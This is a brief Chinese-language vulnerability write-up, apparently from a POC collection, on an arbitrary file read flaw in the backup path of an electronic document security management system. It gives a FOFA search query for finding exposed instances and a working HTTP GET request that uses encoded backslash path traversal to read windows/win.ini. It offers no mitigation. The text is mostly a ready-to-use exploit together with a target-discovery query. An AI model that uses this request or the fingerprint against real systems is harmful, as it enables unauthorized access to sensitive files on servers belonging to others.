# 电子文档安全管理系统backup存在任意文件读取漏洞

# 一、漏洞简介
电子文档安全管理系统backup存在任意文件读取漏洞，攻击者可通过该漏洞获取敏感信息。

# 二、影响版本
+ 电子文档安全管理系统

# 三、资产测绘
+ fofa`body="docsafe/docsafe.nocache.js"`
+ 特征

![1711559478518-0232de33-0834-4e8b-810e-5f00b48ab8c1.png](./img/ohRPmprCIfKOOSbD/1711559478518-0232de33-0834-4e8b-810e-5f00b48ab8c1-521404.png)

# 四、漏洞复现
```plain
GET /resources/backup/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini HTTP/1.1
Host: 
```

![1711559503009-cba29cc4-6a6b-4818-bc51-cd05c8112b1e.png](./img/ohRPmprCIfKOOSbD/1711559503009-cba29cc4-6a6b-4818-bc51-cd05c8112b1e-540735.png)



> 更新: 2024-04-20 22:27:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ef5aearlcpog05ob>